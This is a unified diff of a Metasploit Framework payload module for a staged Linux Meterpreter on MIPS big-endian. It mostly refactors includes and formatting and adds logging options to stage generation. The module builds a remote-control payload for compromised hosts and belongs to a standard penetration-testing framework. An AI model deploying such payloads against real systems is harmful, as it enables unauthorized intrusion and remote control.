@@ -3,28 +3,25 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/base/sessions/meterpreter_mipsbe_linux'
-require 'msf/base/sessions/meterpreter_options'
-require 'msf/base/sessions/mettle_config'
 require 'rex/elfparsey'
 
 module MetasploitModule
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name'        => 'Linux Meterpreter',
+        'Name' => 'Linux Meterpreter',
         'Description' => 'Inject the mettle server payload (staged)',
-        'Author'      => [
+        'Author' => [
           'Adam Cammack <adam_cammack[at]rapid7.com>'
         ],
-        'Platform'    => 'linux',
-        'Arch'        => ARCH_MIPSBE,
-        'License'     => MSF_LICENSE,
-        'Session'     => Msf::Sessions::Meterpreter_mipsbe_Linux
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSBE,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_mipsbe_Linux
       )
     )
   end
@@ -92,7 +89,10 @@ module MetasploitModule
   end
 
   def generate_stage(opts = {})
-    MetasploitPayloads::Mettle.new('mips-linux-muslsf',
-      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
+    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))
+    MetasploitPayloads::Mettle.new(
+      'mips-linux-muslsf',
+      generate_config(opts.merge(config_opts))
+    ).to_binary :process_image
   end
 end
